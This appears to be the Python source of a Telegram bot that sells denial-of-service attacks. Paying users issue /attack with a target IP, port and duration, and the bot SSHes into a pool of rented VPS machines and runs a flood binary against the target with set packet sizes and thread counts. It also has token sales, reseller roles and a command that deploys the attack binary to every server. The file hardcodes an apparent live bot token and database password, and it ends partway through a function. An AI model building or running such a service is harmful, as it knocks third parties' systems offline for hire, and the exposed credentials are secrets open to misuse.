import asyncio
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import pymongo
from pymongo import MongoClient
from bson.objectid import ObjectId
import asyncssh
from datetime import datetime
from hashlib import md5
import base64
import logging
from collections import deque


# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"  # 🔑 Your bot token
OWNER_ID = 5759284972  # 👑 Owner's Telegram ID
RESELLER_IDS = [5851079012]  # 💼 List of reseller IDs

# MongoDB Configuration
MONGODB_URIS = [
    "mongodb+srv://jonny:ranbal1@jonny.wwfqv.mongodb.net/?retryWrites=true&w=majority&appName=jonny",
]
DATABASE_NAME = "LUFFY2"  # 🗄️ Replace with your MongoDB database name

# Attack Parameters
PACKET_SIZE = 1011  # 📦 Packet size for attacks
THREAD = 980  # 🧵 Number of threads
BINARY_NAME = "ranbal"  # ⚙️ Binary name
BINARY_PATH = f"./{BINARY_NAME}"  # 📂 Path to binary on VPS

# Global Variables for Dynamic VPS Allocation
vps_pool = []  # List of all VPS
vps_locks = {}  # Dictionary to track which VPS are in use (True = in use, False = available)
default_vps_count = 1  # Default number of VPS for attacks (can be changed with /vps)

# Initialize the Bot with optimized settings
app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()

# MongoDB Client Helper (Cached Connection)
_mongo_clients = {}
def get_mongo_client(user_id=None):
    """Connect to MongoDB with cached client for speed."""
    key = user_id if user_id else "global"
    if key not in _mongo_clients:
        uri = MONGODB_URIS[0] if user_id is None else MONGODB_URIS[int(md5(str(user_id).encode()).hexdigest(), 16) % len(MONGODB_URIS)]
        try:
            client = MongoClient(uri, serverSelectionTimeoutMS=5000)  # Faster timeout
            client.server_info()  # Test connection
            _mongo_clients[key] = client[DATABASE_NAME]
        except pymongo.errors.ServerSelectionTimeoutError:
            raise Exception("🚨 MongoDB connection failed!")
    return _mongo_clients[key]

# Logging Actions (Async)
async def log_action(user_id, action):
    """Log user actions with timestamp asynchronously."""
    db = get_mongo_client(user_id)
    await asyncio.to_thread(db.logs.insert_one, {
        "user_id": user_id,
        "action": action,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

# VPS Management
async def get_vps_list():
    """Fetch list of all available VPS asynchronously."""
    db = get_mongo_client(None)
    return await asyncio.to_thread(list, db.vps.find())

# Initialize VPS Pool and Load Default VPS Count
async def initialize_vps_pool():
    """Initialize the VPS pool and load the default VPS count from MongoDB."""
    global vps_pool, vps_locks, default_vps_count
    vps_pool = await get_vps_list()
    vps_locks = {f"{vps['ip']}:{vps['port']}": False for vps in vps_pool}  # Initialize all VPS as available
    logger.info(f"Initialized VPS pool with {len(vps_pool)} VPS")

    # Load default_vps_count from MongoDB (if set)
    db = get_mongo_client(None)
    config = await asyncio.to_thread(db.config.find_one, {"key": "default_vps_count"})
    if config:
        default_vps_count = config["value"]
    else:
        # Set default value in MongoDB
        await asyncio.to_thread(db.config.update_one, {"key": "default_vps_count"}, {"$set": {"value": default_vps_count}}, upsert=True)
    logger.info(f"Loaded default VPS count: {default_vps_count}")

# Check if Binary Exists on VPS
async def check_binary_on_vps(vps):
    """Check if the binary exists on the VPS."""
    try:
        async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
            result = await conn.run(f"test -f {BINARY_PATH} && echo 'exists' || echo 'not found'")
            return result.stdout.strip() == "exists"
    except Exception as e:
        logger.error(f"🚨 Error checking binary on Proxy {vps['ip']}:{vps['port']}: {e}")
        return False

# Attack Execution
async def execute_attack_on_vps(task_id, user_id, ip, port, duration, vps):
    """Execute attack on a single VPS."""
    try:
        async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
            duration_seconds = int(duration)  # Duration is always in seconds
            command = f"{BINARY_PATH} {ip} {port} {duration_seconds} {PACKET_SIZE} {THREAD}"
            result = await conn.run(command)
            db = get_mongo_client(user_id)
            vps_key = f"{vps['ip']}:{vps['port']}"
            status = "completed" if result.exit_status == 0 else "failed"
            await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": status}})
            if result.exit_status != 0:
                raise Exception(f"🔥 Command failed: {result.exit_status}")
    except Exception as e:
        logger.error(f"🚨 Error on Proxy {vps['ip']}:{vps['port']}: {e}")
        db = get_mongo_client(user_id)
        vps_key = f"{vps['ip']}:{vps['port']}"
        await asyncio.to_thread(db.tasks.update_one, {"_id": ObjectId(task_id)}, {"$set": {f"vps_status.{vps_key}": "failed"}})

async def update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, num_vps):
    """Update attack status with a live timer."""
    try:
        start_time = time.time()
        while time.time() - start_time < duration_seconds:
            remaining = max(0, duration_seconds - int(time.time() - start_time))
            timer_text = (
                f"🚀 **Attack in Progress**\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"📦 Allocated Proxy: {num_vps}\n"
                f"⏳ Time Left: `{remaining // 60}m {remaining % 60}s`\n"
                f"💻 Bot by @MrRanDom8"
            )
            try:
                await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=timer_text)
            except:
                pass
            await asyncio.sleep(1)

        db = get_mongo_client(chat_id)
        task = await asyncio.to_thread(db.tasks.find_one, {"_id": ObjectId(task_id)})
        vps_status = task.get("vps_status", {})
        all_completed = all(status == "completed" for status in vps_status.values())
        vps_status_text = "\n".join([f"🌐 {vps}: {status}" for vps, status in vps_status.items()])
        final_text = (
            f"🎉 **Attack Completed Successfully!**\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Allocated Proxy: {num_vps}\n"
            f"📜 VPS Proxy:\n{vps_status_text}\n"
            f"💻 Bot by @MrRanDom8"
        ) if all_completed else (
            f"🚫 **Attack Completed Successfully**\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Allocated Proxy: {num_vps}\n"
            f"📜 Proxy Status:\n{vps_status_text}\n"
            f"💻 Bot by @MrRanDom8"
        )
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Worked", callback_data=f"feedback_{task_id}_success")],
            [InlineKeyboardButton("❌ Failed", callback_data=f"feedback_{task_id}_fail")]
        ]) if all_completed else None
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text, reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"🚨 Error in update_attack_timer: {e}")
        final_text = (
            f"🚫 **Attack Interrupted**\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Allocated Proxy: {num_vps}\n"
            f"💻 Bot by @MrRanDom8"
        )
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text)
    finally:
        for vps in vps_list:
            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
        logger.info(f"🔓 Released {len(vps_list)} VPS for user {chat_id}")

async def execute_batch_attack(task_id, user_id, ip, port, duration, vps_list, update, context, message_id, chat_id, allocated_vps):
    """Coordinate attack across all allocated VPS."""
    try:
        duration_seconds = int(duration)  # Duration is always in seconds
        timer_task = asyncio.create_task(update_attack_timer(update, context, message_id, chat_id, duration_seconds, task_id, vps_list, ip, port, len(allocated_vps)))
        attack_task = asyncio.gather(*[execute_attack_on_vps(task_id, user_id, ip, port, duration, vps) for vps in vps_list])
        await asyncio.gather(timer_task, attack_task)
    except Exception as e:
        logger.error(f"🚨 Error in execute_batch_attack: {e}")
        final_text = (
            f"🚫 **Attack Failed Due to Error**\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Allocated Proxy: {len(allocated_vps)}\n"
            f"💻 Bot by @MrRanDom8"
        )
        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=final_text)
        for vps in allocated_vps:
            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS on failure
        logger.info(f"🔓 Released {len(allocated_vps)} Proxy due to error for user {chat_id}")

# Command Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome users with a stylish message."""
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    db = get_mongo_client(user_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": user_id}, {"$set": {"username": username}}, upsert=True)

    welcome_text = (
        f"🌟 **Welcome to the Elite Bot!**\n"
        f"👤 User: @{username}\n"
        f"💻 Powered by @MrRanDom8\n\n"
        f"✨ Use /help to explore commands!"
    ) if user_id not in [OWNER_ID] + RESELLER_IDS else (
        f"👑 **Welcome Back, {'Owner' if user_id == OWNER_ID else 'Reseller'}!**\n"
        f"👤 User: @{username}\n"
        f"💻 Powered by @MrRanDom8\n\n"
        f"✨ Use /help for your elite commands!"
    )
    asyncio.create_task(log_action(user_id, "started the bot"))
    await update.message.reply_text(welcome_text)

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display a beautifully formatted help menu."""
    user_id = update.message.from_user.id
    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    role = user.get("role", "member") if user else "member"

    if user_id == OWNER_ID or role == "admin":
        help_text = (
            "👑 **Admin/Owner Commands** 👑\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
            "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
            "💰 /removetoken [ID] [AMOUNT] - remove tokens\n"
            "🚫 /ban [ID] - Ban a user\n"
            "✅ /unban [ID] - Unban a user\n"
            "💼 /addreseller [ID] - Add reseller\n"
            "❌ /removereseller [ID] - Remove reseller\n"
            "👑 /setadmin [ID] - Set admin\n"
            "👤 /removeadmin [ID] - Remove admin\n"
            "📋 /listusers - List all users\n"
            "🌐 /add_vps [IP] [PORT] [USER] [PASS] - Add VPS\n"
            "🗑️ /rem_vps [IP] [PORT] - Remove VPS\n"
            "📜 /list_vps - List VPS details\n"
            "⚙️ /setup - Install binary on VPS\n"
            "📤 /upload_binary - Upload binary\n"
            "🔍 /check_lock - Check attack lock status\n"
            "🔓 /release_lock - Manually release attack lock\n"
            "📦 /vps [NUMBER_OF_VPS] - Set default number of VPS for attacks\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💻 Bot by @MrRanDom8"
        )
    elif user_id in RESELLER_IDS or role == "reseller":
        help_text = (
            "💼 **Reseller Commands** 💼\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
            "💰 /addtokens [ID] [AMOUNT] - Add tokens\n"
            "💰 /removetoken [ID] [AMOUNT] - remove tokens\n"
            "📋 /listusers - List all users\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💻 Bot by @MrRanDom8"
        )
    else:
        help_text = (
            "👤 **User Commands** 👤\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔫 /attack [IP] [PORT] [SECONDS] - Launch an attack\n"
            "💰 /checktokens - Check token balance\n"
            "🛒 /buytokens [AMOUNT] - Buy tokens\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💻 Bot by @MrRanDom8"
        )
    await update.message.reply_text(help_text)

async def add_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add tokens to a user's account."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id not in [OWNER_ID] + RESELLER_IDS:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner/Resellers can add tokens!")
        return

    if len(args) < 2:
        await update.message.reply_text("❌ **Usage:** /addtokens [ID] [AMOUNT]")
        return

    target_id, amount = int(args[0]), int(args[1])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$inc": {"tokens": amount}}, upsert=True)
    await update.message.reply_text(f"💰 **Success:** Added `{amount}` tokens to `{target_id}`!\n💻 Bot by @MrRanDom8")

async def remove_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove tokens from a user's account."""
    user_id = update.message.from_user.id
    args = context.args
    
    if user_id not in [OWNER_ID] + RESELLER_IDS:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner/Resellers can remove tokens!")
        return

    if len(args) < 2:
        await update.message.reply_text("❌ **Usage:** /removetoken [ID] [AMOUNT]")
        return

    target_id, amount = int(args[0]), int(args[1])
    db = get_mongo_client(target_id)

    # Ensure tokens do not go below zero
    user = await asyncio.to_thread(db.users.find_one, {"user_id": target_id})
    if not user or user.get("tokens", 0) < amount:
        await update.message.reply_text(f"⚠️ **Error:** User `{target_id}` does not have enough tokens!")
        return

    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$inc": {"tokens": -amount}})
    await update.message.reply_text(f"💰 **Success:** Removed `{amount}` tokens from `{target_id}`!\\n💻 Bot by @MrRanDom8")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user from the bot."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can ban!")
        return
    
    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /ban [ID]")
        return
    

    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"banned": 1}}, upsert=True)
    await update.message.reply_text(f"🚫 **Banned:** User `{target_id}` is now blocked!\n💻 Bot by @MrRanDom8")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can unban!")
        return
    
    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /unban [ID]")
        return
    

    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"banned": 0}})
    await update.message.reply_text(f"✅ **Unbanned:** User `{target_id}` is back!\n💻 Bot by @MrRanDom8")

async def add_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Grant reseller privileges."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can add resellers!")
        return
    
    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /addreseller [ID]")
        return
    

    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "reseller"}}, upsert=True)
    await update.message.reply_text(f"💼 **Promoted:** User `{target_id}` is now a reseller!\n💻 Bot by @MrRanDom8")

async def remove_reseller(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Revoke reseller privileges."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove resellers!")
        return
    
    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /removereseller [ID]")
        return
    

    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "member"}})
    await update.message.reply_text(f"👤 **Demoted:** User `{target_id}` is no longer a reseller!\n💻 Bot by @MrRanDom8")

async def set_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Grant admin privileges."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can set admins!")
        return

    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /setadmin [ID]")
        return
    
    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "admin"}}, upsert=True)
    await update.message.reply_text(f"👑 **Promoted:** User `{target_id}` is now an admin!\n💻 Bot by @MrRanDom8")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Revoke admin privileges."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove admins!")
        return
    
    if len(args) < 1:
        await update.message.reply_text("❌ **Usage:** /removeadmin [ID]")
        return
    

    target_id = int(args[0])
    db = get_mongo_client(target_id)
    await asyncio.to_thread(db.users.update_one, {"user_id": target_id}, {"$set": {"role": "member"}})
    await update.message.reply_text(f"👤 **Demoted:** User `{target_id}` is no longer an admin!\n💻 Bot by @MrRanDom8")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all registered users."""
    user_id = update.message.from_user.id
    if user_id not in [OWNER_ID] + RESELLER_IDS:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner/Resellers can list users!")
        return

    user_list = []
    for uri in MONGODB_URIS:
        client = MongoClient(uri)
        db = client[DATABASE_NAME]
        user_list.extend(await asyncio.to_thread(list, db.users.find()))
    
    if not user_list:
        await update.message.reply_text("🛑 **No Users Found!**\n💻 Bot by @MrRanDom8")
        return

    user_text = "\n".join([f"🆔 `{u['user_id']}` | 📛 @{u.get('username', 'Unknown')} | 🎭 {u.get('role', 'member')} | 🚦 {'🔴 Banned' if u.get('banned', 0) else '🟢 Active'} | 💰 Tokens: {u.get('tokens', 0)}" for u in user_list])
    await update.message.reply_text(f"👥 **User List**\n━━━━━━━━━━━━━━━━━━━━━━\n{user_text}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")

async def add_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a new VPS to the pool, identified by IP and PORT."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can add VPS!")
        return
    
    if len(args) < 4:
        await update.message.reply_text("❌ **Usage:** /add_vps [IP] [PORT] [USER] [PASS]")
        return
    

    vps_ip, port, username, password = args[0], int(args[1]), args[2], args[3]
    db = get_mongo_client(None)
    if await asyncio.to_thread(db.vps.find_one, {"ip": vps_ip, "port": port}):
        await update.message.reply_text(f"❌ **Error:** VPS `{vps_ip}:{port}` already exists!\n💻 Bot by @MrRanDom8")
        return

    await asyncio.to_thread(db.vps.insert_one, {"ip": vps_ip, "port": port, "username": username, "password": password})
    await initialize_vps_pool()  # Reinitialize the VPS pool after adding a VPS
    await update.message.reply_text(f"🌐 **VPS Added:** `{vps_ip}:{port}`\nRun /setup to install binary!\n💻 Bot by @MrRanDom8")

async def rem_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a VPS from the pool, identified by IP and PORT."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can remove VPS!")
        return
    
    if len(args) < 2:
        await update.message.reply_text("❌ **Usage:** /rem_vps [IP] [PORT]")
        return
    

    vps_ip, port = args[0], int(args[1])
    db = get_mongo_client(None)
    result = await asyncio.to_thread(db.vps.delete_one, {"ip": vps_ip, "port": port})
    await initialize_vps_pool()  # Reinitialize the VPS pool after removing a VPS
    await update.message.reply_text(
        f"🗑️ **VPS Removed:** `{vps_ip}:{port}`\n💻 Bot by @MrRanDom8" if result.deleted_count > 0 else
        f"❌ **Not Found:** VPS `{vps_ip}:{port}` doesn’t exist!\n💻 Bot by @MrRanDom8"
    )

async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List VPS details for Owner/Admin only."""
    user_id = update.message.from_user.id
    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    role = user.get("role", "member") if user else "member"

    if user_id != OWNER_ID and role != "admin":
        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can view VPS details!\n💻 Bot by @MrRanDom8")
        return

    vps_list = await get_vps_list()
    if not vps_list:
        await update.message.reply_text("🛑 **No VPS Found!**\n💻 Bot by @MrRanDom8")
        return

    vps_text = "\n".join([f"🌐 `{v['ip']}:{v['port']}` | 👤 {v['username']}" for v in vps_list])
    await update.message.reply_text(f"📜 **VPS List**\n━━━━━━━━━━━━━━━━━━━━━━\n{vps_text}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")

async def upload_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Upload a binary file to MongoDB."""
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can upload binaries!")
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ **Usage:** Reply to a binary file with /upload_binary!")
        return

    file = await update.message.reply_to_message.document.get_file()
    file_path = await file.download_to_drive()
    with open(file_path, "rb") as f:
        binary_data = base64.b64encode(f.read()).decode('utf-8')

    db = get_mongo_client(None)
    await asyncio.to_thread(db.binaries.delete_many, {})
    await asyncio.to_thread(db.binaries.insert_one, {"name": BINARY_NAME, "data": binary_data})
    await update.message.reply_text(f"📤 **Binary Uploaded:** `{BINARY_NAME}` to MongoDB!\n💻 Bot by @MrRanDom8")

async def setup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Install binary on all VPS."""
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can setup VPS!")
        return

    db = get_mongo_client(None)
    binary_doc = await asyncio.to_thread(db.binaries.find_one, {"name": BINARY_NAME})
    if not binary_doc:
        await update.message.reply_text("❌ **Error:** No binary found! Upload with /upload_binary first!\n💻 Bot by @MrRanDom8")
        return

    binary_data = base64.b64decode(binary_doc["data"])
    binary_base64 = base64.b64encode(binary_data).decode('utf-8')  # Encode binary as base64 string for transfer
    vps_list = await get_vps_list()
    if not vps_list:
        await update.message.reply_text("❌ **Error:** No VPS available! Add some with /add_vps!\n💻 Bot by @MrRanDom8")
        return

    failed_vps = []
    async def setup_vps(vps):
        try:
            async with asyncssh.connect(vps['ip'], port=vps['port'], username=vps['username'], password=vps['password'], known_hosts=None) as conn:
                # Check disk space and permissions
                disk_check = await conn.run("df -h .")
                if disk_check.exit_status != 0:
                    raise Exception(f"Failed to check disk space: {disk_check.stderr}")
                logger.info(f"Disk space on {vps['ip']}:{vps['port']}: {disk_check.stdout}")

                # Remove any existing binary
                await conn.run(f"rm -f {BINARY_PATH}")

                # Write the binary using base64 decoding
                command = f"echo '{binary_base64}' | base64 -d > {BINARY_PATH}"
                write_result = await conn.run(command)
                if write_result.exit_status != 0:
                    raise Exception(f"Failed to write binary: {write_result.stderr}")

                # Set executable permissions
                chmod_result = await conn.run(f"chmod +x {BINARY_PATH}")
                if chmod_result.exit_status != 0:
                    raise Exception(f"Failed to set executable permissions: {chmod_result.stderr}")

                # Verify the binary exists
                verify_result = await conn.run(f"test -f {BINARY_PATH} && echo 'exists' || echo 'not found'")
                if verify_result.stdout.strip() != "exists":
                    raise Exception("Binary upload failed: File not found after upload")
        except Exception as e:
            logger.error(f"🚨 Setup failed on VPS {vps['ip']}:{vps['port']}: {e}")
            failed_vps.append(f"{vps['ip']}:{vps['port']}")

    await asyncio.gather(*[setup_vps(vps) for vps in vps_list])
    if failed_vps:
        await update.message.reply_text(
            f"⚠️ **Setup Failed on Some VPS:**\n"
            f"Failed VPS: {', '.join(failed_vps)}\n"
            f"Please check logs and ensure VPS is accessible!\n"
            f"💻 Bot by @MrRanDom8"
        )
    else:
        await update.message.reply_text(f"⚙️ **Setup Complete:** `{BINARY_NAME}` installed on all VPS!\n💻 Bot by @MrRanDom8")

async def vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set the default number of VPS for attacks (Owner only)."""
    user_id = update.message.from_user.id
    args = context.args
    if user_id != OWNER_ID:
        await update.message.reply_text("🚫 **Access Denied:** Only Owner can set the default VPS count!")
        return
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("❌ **Usage:** /vps [NUMBER_OF_VPS]")
        return

    global default_vps_count
    default_vps_count = int(args[0])
    db = get_mongo_client(None)
    await asyncio.to_thread(db.config.update_one, {"key": "default_vps_count"}, {"$set": {"value": default_vps_count}}, upsert=True)
    await update.message.reply_text(f"📦 **Default VPS Count Set:** {default_vps_count} VPS per attack\n💻 Bot by @MrRanDom8")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch an attack on the target using the default number of VPS."""
    user_id = update.message.from_user.id
    args = context.args
    if len(args) != 3:  # Expecting IP, PORT, SECONDS
        await update.message.reply_text("❌ **Usage:** /attack [IP] [PORT] [SECONDS]")
        return

    ip, port, duration = args[0], args[1], args[2]

    # Validate that duration is a plain number (no units)
    if not duration.isdigit():
        await update.message.reply_text("❌ **Error:** Duration must be a number in seconds (e.g., 20 for 20 seconds). Units like 'm', 'h', or 'd' are not allowed!\n💻 Bot by @MrRanDom8")
        return

    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    if not user or user.get("tokens", 0) <= 0:
        await update.message.reply_text("❌ **Error:** Insufficient tokens! Use /buytokens to get more!\n💻 Bot by @MrRanDom8")
        return

    # Check if there are any VPS available
    if not vps_pool:
        await update.message.reply_text("❌ **Error:** No VPS available! Add VPS with /add_vps!\n💻 Bot by @MrRanDom8")
        return

    # Use the default number of VPS
    num_vps = default_vps_count

    # Find available VPS
    available_vps = [vps for vps in vps_pool if not vps_locks[f"{vps['ip']}:{vps['port']}"]]
    if len(available_vps) < num_vps:
        await update.message.reply_text(f"⏳ **Insufficient Proxy Available:** Only {len(available_vps)} Proxy are free, but {num_vps} are required!\n💻 Bot by @MrRanDom8")
        return

    # Allocate the requested number of VPS
    allocated_vps = available_vps[:num_vps]
    for vps in allocated_vps:
        vps_locks[f"{vps['ip']}:{vps['port']}"] = True  # Mark as in use
    logger.info(f"🔒 Allocated {num_vps} Proxy to user {user_id} for attack on {ip}:{port}")

    # Check if binary exists on all allocated VPS
    missing_binary_vps = []
    for vps in allocated_vps:
        if not await check_binary_on_vps(vps):
            missing_binary_vps.append(f"{vps['ip']}:{vps['port']}")
    
    if missing_binary_vps:
        for vps in allocated_vps:
            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
        await update.message.reply_text(
            f"❌ **Error:** Binary `{BINARY_NAME}` not found on the following Proxy:\n"
            f"{', '.join(missing_binary_vps)}\n"
            f"Please run /setup to install the binary!\n"
            f"💻 Bot by @MrRanDom8"
        )
        return

    try:
        await asyncio.to_thread(db.users.update_one, {"user_id": user_id}, {"$inc": {"tokens": -1}})
        task = {
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "vps_ips": [f"{vps['ip']}:{vps['port']}" for vps in allocated_vps],
            "status": "running",
            "vps_status": {f"{vps['ip']}:{vps['port']}": "running" for vps in allocated_vps},
            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "end_time": None
        }
        task_id = str((await asyncio.to_thread(db.tasks.insert_one, task)).inserted_id)

        initial_msg = await update.message.reply_text(
            f"🚀 **Attack Launched**\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Allocated Proxy: {num_vps}\n"
            f"⏳ Time Left: Calculating...\n"
            f"💻 Bot by @MrRanDom8"
        )
        await execute_batch_attack(task_id, user_id, ip, port, duration, allocated_vps, update, context, initial_msg.message_id, update.message.chat_id, allocated_vps)
    except Exception as e:
        logger.error(f"🚨 Error in attack for user {user_id}: {e}")
        for vps in allocated_vps:
            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS on error
        await update.message.reply_text(f"❌ **Error During Attack:** {str(e)}\n💻 Bot by @MrRanDom8")

async def check_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check the status of the VPS locks (Owner/Admin only)."""
    user_id = update.message.from_user.id
    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    role = user.get("role", "member") if user else "member"

    if user_id != OWNER_ID and role != "admin":
        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can check the lock status!\n💻 Bot by @MrRanDom8")
        return

    vps_status = "\n".join([f"🌐 {vps_key}: {'🔒 In Use' if vps_locks[vps_key] else '🔓 Available'}" for vps_key in vps_locks])
    await update.message.reply_text(f"🔍 **VPS Lock Status**\n━━━━━━━━━━━━━━━━━━━━━━\n{vps_status}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")

async def release_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually release all VPS locks (Owner/Admin only)."""
    user_id = update.message.from_user.id
    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    role = user.get("role", "member") if user else "member"

    if user_id != OWNER_ID and role != "admin":
        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can release the lock!\n💻 Bot by @MrRanDom8")
        return

    for vps_key in vps_locks:
        vps_locks[vps_key] = False
    logger.info(f"🔓 All VPS locks manually released by user {user_id}")
    await update.message.reply_text("🔓 **All VPS Locks Released Manually!**\n💻 Bot by @MrRanDom8")

async def check_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user's token balance."""
    user_id = update.message.from_user.id
    db = get_mongo_client(user_id)
    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
    tokens = user.get("tokens", 0) if user else 0
    await update.message.reply_text(f"💰 **Token Balance:** `{tokens}`\n💻 Bot by @MrRanDom8")

async def buy_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Request to buy tokens and notify the owner."""
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "Unknown"
    args = context.args
